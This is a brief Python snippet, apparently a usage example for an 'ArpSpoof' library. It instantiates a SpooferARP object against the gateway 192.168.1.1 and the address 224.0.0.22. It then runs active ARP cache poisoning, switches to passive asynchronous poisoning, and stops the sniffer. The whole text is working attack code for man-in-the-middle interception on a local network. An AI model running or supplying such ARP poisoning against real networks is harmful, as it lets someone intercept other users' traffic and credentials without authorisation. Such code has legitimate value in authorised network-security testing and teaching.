from ArpSpoof import SpooferARP

spoofer = SpooferARP('192.168.1.1', '224.0.0.22')
spoofer.active_cache_poisonning()

spoofer = SpooferARP('192.168.1.1', '224.0.0.22', conf.iface, False, 0.5)
spoofer.passive_cache_poisonning(asynchronous=True)
spoofer.run = False
spoofer.sniffer.stop()